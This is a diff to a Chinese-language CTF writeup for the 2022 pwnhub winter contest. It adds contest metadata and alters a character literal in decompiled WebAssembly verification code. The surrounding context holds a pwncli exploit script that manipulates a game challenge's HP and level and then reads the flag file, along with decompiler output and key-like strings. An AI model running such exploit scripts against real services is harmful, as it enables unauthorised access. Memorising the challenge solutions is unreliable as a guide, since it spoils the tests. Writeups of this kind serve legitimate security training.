@@ -83,6 +83,8 @@ prerequisites:
 - RSA 共享素数
 - LLL 短向量
 - hash length extension 原理
+contest_normalized: "pwnhub 冬季赛"
+contest_year: 2022
 ---
 # 2022 pwnhub冬季赛 writeup by Arr3stY0u
 
@@ -235,7 +237,7 @@ webasm：
 
 读出来是”flag is flag{“
 
-c /* verify */ iVar1 = verify_8014eed4(0); if (iVar1 != 0) { return 1; }code_r0x8014f4e3: if (*(char *)((int)register0x00000008 + 0x10) != ' ') {code_r0x8014f4f4: *(undefined8 *)((int)register0x00000008 + 0x68) = 0; *(undefined8 *)((int)register0x00000008 + 0x70) = 0; *(undefined8 *)register0x00000008 = 0; /* flag is flag{ */ *(undefined8 *)((int)register0x00000008 + 8) = 0x205be; *(undefined8 *)((int)register0x00000008 + 0x10) = 0xd;
+c /* verify */ iVar1 = verify_8014eed4(0); if (iVar1 != 0) { return 1; }code_r0x8014f4e3: if (*(char *)((int)register0x00000008 + 0x10) != '\\x00') {code_r0x8014f4f4: *(undefined8 *)((int)register0x00000008 + 0x68) = 0; *(undefined8 *)((int)register0x00000008 + 0x70) = 0; *(undefined8 *)register0x00000008 = 0; /* flag is flag{ */ *(undefined8 *)((int)register0x00000008 + 8) = 0x205be; *(undefined8 *)((int)register0x00000008 + 0x10) = 0xd;
 
 /* EHi87RUC2K5hZDnJJny9QtG1vjTFbSdQWrw8VvTLdpKq */ *(longlong *)register0x00000008 = 0x25531; *(longlong *)((int)register0x00000008 + 8) = lVar3; *(longlong *)((int)register0x00000008 + 0x10) = 44; register0x00000008 = (BADSPACEBASE *)((int)register0x00000008 + -8); *(longlong *)register0x00000008 = 0x156a0018; iVar2 = unnamed_function_64(0); if (iVar2 != 0) { return 1; }
 
@@ -341,7 +343,7 @@ io.sendlineafter(b'> ', b'2')io.sendlineafter(b'Which one? ', b'9')io.recvuntil(
 Order = io.recvline()io.sendlineafter(b'> ', b'3')io.sendlineafter(b'Order: ', Order)res = io.recvuntil(b'Your Coins: ')print(res)
 from pwncli import *cli_script()io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
 def cmd(i):    sla('>>> ', i)def get_money():    cmd('1')    ru('HP: ')    if int(ru(' ')[:-1]) < 20:        sla('? (1 -> yes / other -> no)',str(1))    else:        sla('? (1 -> yes / other -> no)',str(2))        get_money()def get_flag():    cmd('1')    ru('LV: ')    if int(ru(' ')[:-1]) == 999:        sla('? (1 -> yes / other -> no)',str(1))    else:        sla('? (1 -> yes / other -> no)',str(2))        get_flag()        def hp():    cmd('2')    sla('>>>','3')    sla('How many?','28633116')for i in range(3):    get_money()hp()get_flag()sl('cat flag')sl('cat /flag')ia()
-c /* verify */ iVar1 = verify_8014eed4(0); if (iVar1 != 0) { return 1; }code_r0x8014f4e3: if (*(char *)((int)register0x00000008 + 0x10) != ' ') {code_r0x8014f4f4: *(undefined8 *)((int)register0x00000008 + 0x68) = 0; *(undefined8 *)((int)register0x00000008 + 0x70) = 0; *(undefined8 *)register0x00000008 = 0; /* flag is flag{ */ *(undefined8 *)((int)register0x00000008 + 8) = 0x205be; *(undefined8 *)((int)register0x00000008 + 0x10) = 0xd;
+c /* verify */ iVar1 = verify_8014eed4(0); if (iVar1 != 0) { return 1; }code_r0x8014f4e3: if (*(char *)((int)register0x00000008 + 0x10) != '\\x00') {code_r0x8014f4f4: *(undefined8 *)((int)register0x00000008 + 0x68) = 0; *(undefined8 *)((int)register0x00000008 + 0x70) = 0; *(undefined8 *)register0x00000008 = 0; /* flag is flag{ */ *(undefined8 *)((int)register0x00000008 + 8) = 0x205be; *(undefined8 *)((int)register0x00000008 + 0x10) = 0xd;
 /* EHi87RUC2K5hZDnJJny9QtG1vjTFbSdQWrw8VvTLdpKq */ *(longlong *)register0x00000008 = 0x25531; *(longlong *)((int)register0x00000008 + 8) = lVar3; *(longlong *)((int)register0x00000008 + 0x10) = 44; register0x00000008 = (BADSPACEBASE *)((int)register0x00000008 + -8); *(longlong *)register0x00000008 = 0x156a0018; iVar2 = unnamed_function_64(0); if (iVar2 != 0) { return 1; }
 11111111111111111111111111111110 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9P11111111111111111111111111111111 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9Q11111111111111111111111111111112 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9R11111111111111111111111111111113 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9S11111111111111111111111111111114 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs95
 *(longlong *)((int)register0x00000008 + 0x60) = 0x6665656264616564; // "deadbeef"..._80100559(0);..._801007d7(0);
